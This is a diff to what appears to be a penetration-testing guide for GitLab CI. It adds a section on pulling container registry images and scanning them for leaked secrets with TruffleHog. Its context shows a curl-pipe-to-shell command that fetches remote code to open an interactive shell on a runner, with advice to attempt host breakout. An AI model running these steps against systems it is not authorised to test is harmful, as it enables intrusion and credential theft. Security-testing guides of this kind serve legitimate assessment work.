@@ -303,3 +303,12 @@ $ curl -sSf https://sshx.io/get | sh -s run
 ```
 
 From the interactive shell, you can now try breakout to the host, or find runner misconfigurations e.g. host mounted volumes.
+
+## Scanning Container Registries
+
+If the GitLab instance has a container registry enabled, check if you have access to pull container images. These images often contain hardcoded secrets, credentials, or sensitive configuration files that were accidentally included during the build process.
+
+Using [TruffleHog](https://github.com/trufflesecurity/trufflehog):
+```bash
+trufflehog docker --image registry.leakycompany.com/auser/arepo 
+```
